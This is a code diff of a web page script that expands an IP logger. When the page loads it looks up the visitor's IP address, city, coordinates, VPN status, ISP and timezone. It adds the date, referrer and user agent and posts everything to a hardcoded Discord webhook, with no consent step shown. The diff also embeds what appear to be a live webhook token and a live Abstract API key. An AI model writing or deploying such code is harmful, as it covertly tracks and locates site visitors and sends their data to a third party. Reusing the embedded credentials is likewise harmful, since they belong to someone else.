@@ -1,30 +1,70 @@
-// script.js
 // Function to send data to Discord webhook
-function sendToDiscord(data) {
-  
+function sendToDiscord(ipData, userData) {
     const webhookUrl = 'https://discord.com/api/webhooks/1165962811164348498/jgEsHpCRce9Kw8hY0IA4Ys9SN9dHMDVbVQmzp1J4BLVDjsCfMHyd2lcag4B0c5cKfIFT';
 
     // Create a message payload
     const message = {
-        content: "Combined Data",
+        content: "IP Details",
         embeds: [
             {
-                title: "User Information",
+                title: "IP Information",
                 fields: [
-                    { name: "Date", value: data.userInfo.date.toString(), inline: true },
-                    { name: "Day", value: data.userInfo.day, inline: true },
-                    { name: "Time", value: data.userInfo.time, inline: true },
-                    { name: "Referring URL", value: data.userInfo.referringURL },
-                    { name: "User Agent", value: data.userInfo.userAgent },
+                    { name: "IP Address", value: ipData.ip },
+                    { name: "City", value: ipData.city },
+                    { name: "Region", value: ipData.region },
+                    { name: "Country", value: ipData.country },
+                    { name: "Continent", value: ipData.continent },
                 ],
             },
             {
-                title: "IP Details",
+                title: "Location",
                 fields: [
-                    { name: "IP Address", value: data.ipDetails.ip },
-                    { name: "City", value: data.ipDetails.city },
-                    { name: "Region", value: data.ipDetails.region },
-                    { name: "Country", value: data.ipDetails.country },
+                    { name: "Latitude", value: ipData.latitude },
+                    { name: "Longitude", value: ipData.longitude },
+                ],
+            },
+            {
+                title: "Security",
+                fields: [
+                    { name: "VPN", value: ipData.security.is_vpn ? "Yes" : "No" },
+                ],
+            },
+            {
+                title: "Timezone",
+                fields: [
+                    { name: "Timezone Name", value: ipData.timezone.name },
+                    { name: "Timezone Abbreviation", value: ipData.timezone.abbreviation },
+                    { name: "Current Time", value: ipData.timezone.current_time },
+                ],
+            },
+            {
+                title: "Flag",
+                image: { url: ipData.flag.png }, // Display the flag image
+            },
+            {
+                title: "Currency",
+                fields: [
+                    { name: "Currency Name", value: ipData.currency.currency_name },
+                    { name: "Currency Code", value: ipData.currency.currency_code },
+                ],
+            },
+            {
+                title: "Connection",
+                fields: [
+                    { name: "AS Number", value: ipData.connection.autonomous_system_number },
+                    { name: "AS Organization", value: ipData.connection.autonomous_system_organization },
+                    { name: "Connection Type", value: ipData.connection.connection_type },
+                    { name: "ISP Name", value: ipData.connection.isp_name },
+                ],
+            },
+            {
+                title: "User Information",
+                fields: [
+                    { name: "Date", value: userData.date.toString() },
+                    { name: "Day", value: userData.day },
+                    { name: "Time", value: userData.time },
+                    { name: "Referring URL", value: userData.referringURL },
+                    { name: "User Agent", value: userData.userAgent },
                 ],
             },
         ],
@@ -43,12 +83,11 @@ function sendToDiscord(data) {
     .catch(error => console.error("Error sending data to Discord:", error));
 }
 
-// Fetch IP details from the Abstract API
+// Fetch IP address from Abstract API
 fetch("https://app.abstractapi.com/q", {
     method: "GET",
     headers: {
-        "X-API-KEY": "YOUR_ABSTRACTAPI_KEY", // Replace with your Abstract API key
-    },
+        "X-API-KEY": "577cf8161d6e494bb7fb0df8e0b9102e", 
 })
     .then(response => response.json())
     .then(ipData => {
@@ -61,13 +100,7 @@ fetch("https://app.abstractapi.com/q", {
             userAgent: navigator.userAgent,
         };
 
-        // Combine IP and user data
-        const combinedData = {
-            ipDetails: ipData,
-            userInfo: userInformation,
-        };
-
         // Send data to Discord webhook
-        sendToDiscord(combinedData);
+        sendToDiscord(ipData, userInformation);
     })
     .catch(error => console.error("Error fetching IP details: ", error));
